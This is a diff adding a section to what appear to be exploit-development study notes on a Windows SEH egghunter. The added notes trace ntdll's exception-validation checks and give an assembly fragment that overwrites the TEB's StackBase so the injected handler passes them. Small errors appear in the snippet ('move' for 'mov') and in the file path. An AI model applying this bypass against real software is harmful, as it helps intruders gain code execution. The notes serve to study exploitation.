@@ -175,3 +175,35 @@ Because syscall numbers change, we want to find an egghunter workaround that is 
 	- But this never happens, every time we continue execution we get an access violation on the same `repe scasd` instruction...
 
 ### Identifying the issue in SEH
+Using static-dynamic analysis (IDA + Windbg)
+- Copy over ntdll.dll from the target box to the dev environment with something like : `[convert]::ToBase64String((Get-Content -path "C:\Windows\system32" -Encoding byte))`
+- Walk through some assembly 
+- bp ntdll!RtlDispatchException, after our access violation
+- ...RtlDispatchException -> RtlpGetStackLimits (which checks stackBase and stackLimit) -> RtlIsValidHandle (runs checks like SafeSEH if enabled)
+	- There is only one call to RtlIsValidHandle in the entire code chain, so this call must be made in order for the handler to get run
+- Dig into the comparisons / branching statements, which are the checks that must be passed to reach the RtlisvalidHandle call. Use breakpoints in Windbg to ensure our code is actually reaching those checks
+	- `cmp ecx,edi` - address of ERR (`_EXCEPTION_REGISTRATION_RECORD`) must be higher than StackLimit (must be on the stack)
+	- `cmp eax,ebx` - address of ERR must be lower than StackBase (must be on the stack)
+	- `test cl,3` - address of ERR must be aligned to the four byte memory boundary 
+	- `cmp ecx,ebx` - address of the exception hander functions must be higher than StackBase or lower than StackLimit (off the stack). 
+	 > **This is the check we are failing**
+
+Since there is no other compile time protections, once we pass these checks, the exploit should be good to go.
+
+### Overcoming the SEH issue
+We can overwrite the StackBase as part of our egghunter so that our exception_handler appears to be after it (being "off" the stack) and keep the ERR on the stack. This is done by overwriting the StackBase value with an address arbitrarily (?) less than the exception_handler pointer, but still greater than the ERR which was just pushed onto the stack.
+```
+build_exception_record:
+	...
+	# where ecx is the address of the exception_handler function
+	# zero out ebx
+	xor ebx, ebx
+	# move the current stack pointer addr (the ERR) to the TEB's ExceptionList
+	move dword ptr fs:[ebx], esp
+	# set a value 4 below the except_handler function to be used as the new StackBase
+	sub ecx, 0x04
+	# set the proper offset to the TEB's StackBase
+	add ebx, 0x04
+	# move the new addr (4 before except_handler) into the TEB's StackBase
+	mov dword ptr fs:[ebx], ecx
+```
